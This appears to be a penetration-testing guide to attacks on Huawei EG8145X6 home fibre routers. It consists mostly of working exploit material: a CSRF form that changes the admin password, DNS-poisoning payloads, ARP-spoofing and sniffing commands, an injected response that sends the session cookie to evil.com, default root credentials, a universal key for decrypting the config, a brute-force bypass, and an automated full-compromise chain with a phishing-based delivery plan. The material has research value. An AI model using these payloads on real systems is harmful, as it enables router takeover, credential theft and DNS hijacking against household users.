# Huawei EG8145X6 — Attack Vectors & PoC Guide

> **Author:** André Henrique (@mrhenrike) | União Geek  
> **Target:** Huawei OptiXstar EG8145X6-10 (GPON ONT)  
> **Applies to:** EG8145X6, EG8145V5, EG8141A5, HN8145X6, HS8145X6

---

## Table of Contents

1. [CSRF Remote Password Change (No LAN Required)](#1-csrf-remote-password-change)
2. [CSRF DNS Poisoning (Pharming Attack)](#2-csrf-dns-poisoning)
3. [MitM Credential Interception](#3-mitm-credential-interception)
4. [MitM + RCE via dealDataWithFun()](#4-mitm-rce-via-dealdatawithfun)
5. [Physical Access — UART Shell + Config Decryption](#5-physical-access--uart-shell)
6. [Pre-Auth Information Disclosure](#6-pre-auth-information-disclosure)
7. [User Enumeration via CheckPwdNotLogin](#7-user-enumeration)
8. [Brute-Force with Rate-Limit Bypass](#8-brute-force-with-rate-limit-bypass)
9. [WiFi Credential Extraction (Authenticated)](#9-wifi-credential-extraction)
10. [Generic Modules (GPON, UPnP, Shellshock)](#10-generic-modules)
11. [AutoPwn — Full Chain](#11-autopwn-full-chain)

---

## 1. CSRF Remote Password Change

**Severity:** CRITICAL  
**Requires:** Victim with active router session visits attacker page  
**LAN access:** NO — works from any website on the internet  
**Module:** `exploits/routers/huawei/eg8145x6_csrf_payload_generator`

### Why It Works

The EG8145X6 has a CSRF token (`x.X_HW_Token`) that is:
- **Static** — `getRandString.asp` returns the same value every time
- **Not validated** — server accepts empty, fake, or absent tokens

When the admin has an active session (cookie not expired) and visits any page containing the CSRF payload, the browser sends the session cookie along with the forged request.

### RouterXPL Syntax

```
rxf > use exploits/routers/huawei/eg8145x6_csrf_payload_generator
rxf (EG8145X6 CSRF Gen) > set target 192.168.18.1
rxf (EG8145X6 CSRF Gen) > set action password
rxf (EG8145X6 CSRF Gen) > set new_password MyNewP@ss!
rxf (EG8145X6 CSRF Gen) > set output_dir /tmp/csrf_payloads
rxf (EG8145X6 CSRF Gen) > run
```

Available actions: `password`, `dns`, `telnet`, `firewall`, `wifi`, `portfwd`, `all`

### Manual PoC

```html
<iframe name="x" style="display:none"></iframe>
<form id="f" method="POST" action="http://192.168.18.1/html/ssmp/userpassword/userpassword.cgi" target="x">
  <input type="hidden" name="x.X_HW_Token" value=""/>
  <input type="hidden" name="x.UserPassword" value="TXlOZXdQQHNzIQ=="/>
  <input type="hidden" name="x.UserPasswordConfirm" value="TXlOZXdQQHNzIQ=="/>
</form>
<script>document.getElementById('f').submit();</script>
```

### Delivery Methods
- Phishing email with HTML attachment
- Malicious advertisement (malvertising)
- Waterhole attack (compromised site the admin visits)
- Social media link

---

## 2. CSRF DNS Poisoning

**Severity:** HIGH  
**Requires:** Same as CSRF above  
**LAN access:** NO  
**Module:** `exploits/routers/huawei/eg8145x6_dns_poison_csrf`

### Impact

Once DNS is changed to attacker-controlled resolvers, ALL devices on the network resolve through the attacker:
- Fake banking/email/social login pages → credential harvesting
- Malware distribution via fake software updates
- Persists across device reboots

### RouterXPL Syntax

```
rxf > use exploits/routers/huawei/eg8145x6_dns_poison_csrf
rxf (EG8145X6 DNS Poison) > set target 192.168.18.1
rxf (EG8145X6 DNS Poison) > set dns_primary 1.3.3.7
rxf (EG8145X6 DNS Poison) > set dns_secondary 1.3.3.8
rxf (EG8145X6 DNS Poison) > run
```

---

## 3. MitM Credential Interception

**Severity:** CRITICAL  
**Requires:** Same LAN + someone logs into the router  
**LAN access:** YES  
**Module:** `exploits/routers/huawei/eg8145x6_mitm_credential_intercept`

### Why It Works

The login sends the password as `base64encode(password)` over plain HTTP (port 80). No HTTPS available. ARP spoofing + traffic sniffing reveals the password in real time.

### Attack Steps

1. ARP spoof to position yourself between victim and router:
   ```bash
   sudo arpspoof -i eth0 -t <victim_ip> 192.168.18.1
   sudo arpspoof -i eth0 -t 192.168.18.1 <victim_ip>
   ```
2. Capture HTTP traffic:
   ```bash
   sudo tcpdump -i eth0 -A 'host 192.168.18.1 and port 80' | grep -i 'PassWord='
   ```
3. Decode captured base64:
   ```bash
   echo "YWRtaW4=" | base64 -d
   # Output: admin
   ```

### RouterXPL Syntax

```
rxf > use exploits/routers/huawei/eg8145x6_mitm_credential_intercept
rxf (EG8145X6 MitM) > set target 192.168.18.1
rxf (EG8145X6 MitM) > run
```

### Alternative Tools
- `bettercap` — automated ARP spoof + credential sniffing
- `ettercap` — GUI-based MitM
- `mitmproxy` — HTTP proxy with credential logging

---

## 4. MitM + RCE via dealDataWithFun()

**Severity:** CRITICAL  
**Requires:** MitM position + admin making any request to router  
**LAN access:** YES  
**Module:** (Documented in `eg8145x6_mitm_credential_intercept`)

### How It Works

The `util.js` firmware file contains:

```javascript
function dealDataWithFun(str) {
    return Function('"use strict";return (' + str + ')')();
}
```

All AJAX responses from `/asp/*.asp` endpoints are processed through this function. If an attacker intercepts and modifies the response (via MitM), they can inject arbitrary JavaScript that executes in the admin's browser context.

### Attack Flow

1. ARP spoof the admin's machine
2. Intercept any AJAX request to `192.168.18.1/asp/*.asp`
3. Replace response with: `function(){document.location='http://evil.com/steal?c='+document.cookie}`
4. The router's JS evaluates it via `Function()` constructor → code execution

### Impact
- Steal admin session cookies
- Execute any admin action (change password, disable firewall, enable telnet)
- Install persistent backdoor (change DNS + modify router JS)

---

## 5. Physical Access — UART Shell

**Severity:** CRITICAL (full device compromise)  
**Requires:** Physical access to the device  
**LAN access:** N/A  
**Module:** `exploits/routers/huawei/eg8145x6_telnet_enable` (post-exploitation)

### What You Need

- **Phillips screwdriver** — remove 2 screws on the bottom
- **UART adapter** (USB-TTL, 3.3V) — CP2102, CH340, or FTDI
- **Jumper wires** — 3 (TX, RX, GND)
- **Terminal software** — PuTTY, minicom, or screen

### Disassembly Steps

1. **Remove screws**: 2 Phillips screws on the bottom plate (may be under rubber feet)
2. **Pry open**: Use a plastic spudger to separate the top and bottom shells along the seam
3. **Locate UART pads**: On the PCB, look for 4 pads labeled (or unlabeled) near the SoC:
   - **GND** — connect to adapter GND
   - **TX** — connect to adapter RX
   - **RX** — connect to adapter TX
   - **VCC** — do NOT connect (3.3V reference only)
4. **Solder header pins** or use test clips/probes

### UART Connection

```
Baud rate: 115200
Data bits: 8
Stop bits: 1
Parity:    None
Flow:      None
```

```bash
# Linux
screen /dev/ttyUSB0 115200

# Windows (PuTTY)
Serial line: COM3  Speed: 115200
```

### Post-UART Access

Once you get the boot log / shell prompt:

```bash
# Default root credentials
login: root
password: adminHW

# Extract config file
cat /mnt/jffs2/hw_ctree.xml > /tmp/config.xml

# Or via tftp
tftp -p -l /mnt/jffs2/hw_ctree.xml <your_ip>
```

### Config Decryption (hw_ctree.xml)

The config file is AES-128-CBC encrypted. Universal key:

```
Key: 13395537D2730554A176799F6D56A239
IV:  First 16 bytes of the encrypted file
```

RouterXPL module:
```
rxf > use exploits/routers/huawei/eg8145x6_config_decrypt
rxf (EG8145X6 Config) > set target 192.168.18.1
rxf (EG8145X6 Config) > run
```

Or manually with OpenSSL:
```bash
# Skip first 16 bytes (IV), decrypt rest
dd if=hw_ctree.xml bs=16 skip=1 | \
  openssl enc -aes-128-cbc -d -K 13395537D2730554A176799F6D56A239 \
  -iv $(xxd -p -l 16 hw_ctree.xml) > config_decrypted.xml
```

### What's Inside the Decrypted Config

- **Admin password** (plaintext)
- **WiFi SSIDs and passwords** (all bands)
- **PPPoE credentials** (ISP username/password)
- **TR-069 ACS URL and credentials**
- **Telnet/SSH enable flags** (`TELNETLanEnable`)
- **Port forwarding rules**
- **DNS settings**
- **VoIP SIP credentials** (if configured)

### Enable Telnet Remotely (Post-Decryption)

Edit the decrypted XML:
```xml
<TELNETLanEnable>1</TELNETLanEnable>
<TELNETLanPort>23</TELNETLanPort>
```

Re-encrypt and upload, then:
```bash
telnet 192.168.18.1 23
# login: root / adminHW
```

---

## 6. Pre-Auth Information Disclosure

**Severity:** MEDIUM  
**Requires:** Network access to port 80  
**LAN access:** YES  
**Module:** `exploits/routers/huawei/eg8145x6_info_disclosure`

### RouterXPL Syntax

```
rxf > use exploits/routers/huawei/eg8145x6_info_disclosure
rxf (EG8145X6 Info) > set target 192.168.18.1
rxf (EG8145X6 Info) > run
```

### Extracted Data (No Auth)
- ProductName, APPVersion, CfgMode, ProductType
- Build timestamp, ISP configuration mode
- CSRF tokens (both static and dynamic)
- CSP headers analysis
- HTTPS availability check
- CheckPwdNotLogin.asp accessibility

---

## 7. User Enumeration

**Severity:** MEDIUM  
**Requires:** Network access to port 80  
**LAN access:** YES  
**Module:** `exploits/routers/huawei/eg8145x6_preauth_password_enum`

The endpoint `/asp/CheckPwdNotLogin.asp` returns different responses for valid vs invalid usernames:
- Valid user (e.g., `Epuser`): returns `"0"`
- Invalid user: returns empty string

```
rxf > use exploits/routers/huawei/eg8145x6_preauth_password_enum
rxf (EG8145X6 UserEnum) > set target 192.168.18.1
rxf (EG8145X6 UserEnum) > run
```

---

## 8. Brute-Force with Rate-Limit Bypass

**Severity:** HIGH  
**Requires:** Network access to port 80  
**LAN access:** YES  
**Module:** `exploits/routers/huawei/eg8145x6_bruteforce_login`

The rate-limit (3 attempts then lock) is session-based. Rotating sessions (new cookies per attempt) bypasses it entirely.

```
rxf > use exploits/routers/huawei/eg8145x6_bruteforce_login
rxf (EG8145X6 BF) > set target 192.168.18.1
rxf (EG8145X6 BF) > run
```

---

## 9. WiFi Credential Extraction

**Severity:** HIGH (requires auth)  
**Requires:** Valid admin session  
**LAN access:** YES  
**Module:** `exploits/routers/huawei/eg8145x6_wifi_credential_extractor`

Extracts WiFi SSID/password, PPPoE credentials, TR-069 config, DNS settings from authenticated pages. Also probes SNMP and attempts config file download.

```
rxf > use exploits/routers/huawei/eg8145x6_wifi_credential_extractor
rxf (EG8145X6 WiFi Extract) > set target 192.168.18.1
rxf (EG8145X6 WiFi Extract) > set username admin
rxf (EG8145X6 WiFi Extract) > set password <known_password>
rxf (EG8145X6 WiFi Extract) > run
```

If you have a session cookie from MitM:
```
rxf (EG8145X6 WiFi Extract) > set session_cookie "SID=abc123; body:Language:english:id=0"
rxf (EG8145X6 WiFi Extract) > run
```

---

## 10. Generic Modules

These modules test for multi-vendor vulnerabilities that may apply to GPON devices:

| Module | CVE | What it tests |
|---|---|---|
| `gpon/home_gateway_rce` | CVE-2018-10562 | GPON auth bypass + command injection |
| `gpon/routers_authentication_bypass` | CVE-2018-10561 | GPON authentication bypass |
| `generic/shellshock` | CVE-2014-6271 | Bash CGI command injection |
| `generic/heartbleed` | CVE-2014-0160 | OpenSSL memory leak |
| `generic/upnp/ssdp_msearch` | — | UPnP service discovery |
| `multi/rom0_password_extraction` | — | RomPager config password leak |
| `multi/tcp_32764_backdoor_rce` | — | SerComm backdoor |
| `multi/nat_slipstream` | — | NAT ALG pinhole opening |
| `huawei/hg532_rce` | CVE-2017-17215 | UPnP SOAP command injection |

### Test Results on EG8145X6-10 (Tested 2026-04-05)

| Module | Result | Detail |
|---|---|---|
| GPON Auth Bypass | **403 Blocked** | `/GponForm/` exists but requires auth |
| UPnP SSDP | **Timeout** | UPnP not exposed on LAN |
| Shellshock | **Not Vulnerable** | CGI does not use bash |
| rom-0 | **403 Blocked** | File exists but auth required |
| TCP 32764 | **Refused** | Backdoor not present |
| HG532 UPnP RCE | **Port closed** | 37215 not listening |
| SIP ALG | **Reset** | ICMP port unreachable |
| SNMP | **Rejected** | All communities rejected |
| Config files | **All 403** | Auth required for all paths |

---

## 11. AutoPwn — Full Chain

Runs all 10 phases automatically, including generic modules.

```
rxf > use exploits/routers/huawei/eg8145x6_autopwn
rxf (EG8145X6 AutoPwn) > set target 192.168.18.1
rxf (EG8145X6 AutoPwn) > run
```

The autopwn chain:
1. Fingerprints the device
2. Extracts pre-auth data (29+ variables)
3. Analyzes CSRF tokens
4. Enumerates users
5. Brute-forces with rate-limit bypass
6. Attempts config extraction
7. Captures JavaScript source code
8. Scans all ports
9. Generates exploitation report
10. Runs generic modules (automatic if specific exploits are blocked, prompted if credentials were found)

---

## Attack Decision Tree

```
Can you access the same network?
├── YES
│   ├── Is admin currently logged in?
│   │   ├── YES → Session hijack (cookie sniff via ARP spoof)
│   │   └── NO  → Wait for login (MitM) or use CSRF if session persists
│   ├── Do you have physical access?
│   │   ├── YES → UART shell → hw_ctree.xml → full pwn
│   │   └── NO  → MitM + brute-force + CSRF
│   └── Run AutoPwn for automated chain
└── NO (remote only)
    ├── Can you send the admin a link?
    │   ├── YES → CSRF payload (password change / DNS poison / enable telnet)
    │   └── NO  → No remote attack surface without phishing
    └── CSRF + DNS poison = most impactful remote vector
```

---

> **Disclaimer:** These techniques are documented for authorized security testing only. Always obtain written permission before testing.  
> **Author:** André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
